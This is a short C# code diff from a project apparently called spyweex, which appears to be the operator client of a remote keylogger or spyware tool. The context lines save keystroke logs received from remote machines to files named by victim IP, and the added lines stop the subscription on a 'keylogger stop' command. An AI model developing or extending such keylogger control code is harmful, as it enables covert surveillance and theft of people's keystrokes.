@@ -77,6 +77,11 @@ namespace spyweex_client_wpf.Subscribers
                     string path = wxhtpClient.getTcpClient().Client.RemoteEndPoint.ToString().Split(
                         new string[] {":"}, StringSplitOptions.RemoveEmptyEntries)[0] + "_keylogs.txt";
                     System.IO.File.AppendAllLines(@path, lines_to_be_inserted_into_file);
+
+                    if (response.Action.Equals(StaticStrings.ACTION_TYPE.KEYLOGGER_STOP))
+                    {
+                        UnsubscribeAsync();
+                    }
                 },
                 err =>
                 {
